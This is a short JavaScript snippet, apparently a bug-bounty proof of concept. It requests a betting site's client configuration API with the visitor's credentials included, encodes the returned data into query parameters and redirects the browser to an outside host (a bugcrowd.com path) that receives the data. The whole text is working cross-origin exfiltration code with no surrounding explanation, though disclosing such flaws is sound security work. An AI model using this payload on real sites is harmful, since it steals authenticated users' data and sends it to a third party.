fetch('https://www.bwin.de/de/api/clientconfig', { credentials: 'include' })
  .then(res => res.json())
  .then(data => {
    const queryParams = Object.keys(data).map(key => 
      `${encodeURIComponent(key)}=${encodeURIComponent(JSON.stringify(data[key]))}`
    ).join('&');
    window.location = `//bugcrowd.com/404.poc?data=${queryParams}`;
  });
